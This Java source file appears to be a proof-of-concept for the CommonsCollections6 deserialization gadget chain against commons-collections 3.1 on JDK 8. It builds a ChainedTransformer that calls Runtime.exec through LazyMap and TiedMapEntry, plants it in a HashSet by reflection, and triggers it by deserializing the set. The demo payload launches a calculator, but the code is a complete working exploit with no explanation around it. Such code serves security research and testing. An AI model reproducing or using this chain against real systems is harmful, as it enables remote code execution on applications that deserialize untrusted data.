
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;

import java.lang.reflect.*;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC6 { // jdk 8, commons-collections:3.1
    public static void main(String[] args) {
        try {
            ChainedTransformer chain = new ChainedTransformer(
                    new Transformer[] {
                            new ConstantTransformer(Runtime.class),
                            new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class }, new Object[]{"getRuntime", null}),
                            new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { Runtime.class, null }),
                            new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "calc" }),
                            new ConstantTransformer(1)
                    }
            );

            Map lmap = LazyMap.decorate(new HashMap(), chain);

            TiedMapEntry tme = new TiedMapEntry(lmap, "a");

            HashSet hset = new HashSet(1);
            hset.add(1);

            Field hset_hmap = hset.getClass().getDeclaredField("map");
            hset_hmap.setAccessible(true);
            HashMap hmap = (HashMap) hset_hmap.get(hset);

            Field hmap_table = hmap.getClass().getDeclaredField("table");
            hmap_table.setAccessible(true);
            Object[] table = (Object[]) hmap_table.get(hmap);



            Field keyField = null;
            Object theTable = null;
            if (table[0] == null) {
                keyField = table[1].getClass().getDeclaredField("key");
                theTable = table[1];
            } else {
                keyField = table[0].getClass().getDeclaredField("key");
                theTable = table[0];
            }


            keyField.setAccessible(true);
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(keyField, keyField.getModifiers() & ~Modifier.FINAL);

            keyField.set(theTable, tme);

            ByteArrayOutputStream baos = serialize(hset);
            deserialize(baos);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static ByteArrayOutputStream serialize(Object object) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(object);
            return baos;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    static void deserialize(ByteArrayOutputStream baos)  {

        try {
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void deserializeFromFile(String filename) throws IOException, ClassNotFoundException {
        try {
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    static void setFinalField(Object obj, String name, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);

            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);

            field.set(obj, value);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

    }

    static Object getFinalField(Object obj, String name) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);

            Field modifiersField = Field.class
                    .getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers()
                    & ~Modifier.FINAL);

            return field.get(obj);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return null;
    }

    static Object getFieldValue(Object obj, String name) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);
            return field.get(obj);

        } catch (Exception e) {
            System.out.println(e);
            return e;
        }

    }

    static void setFieldValue(Object obj, String name, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(obj, value);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
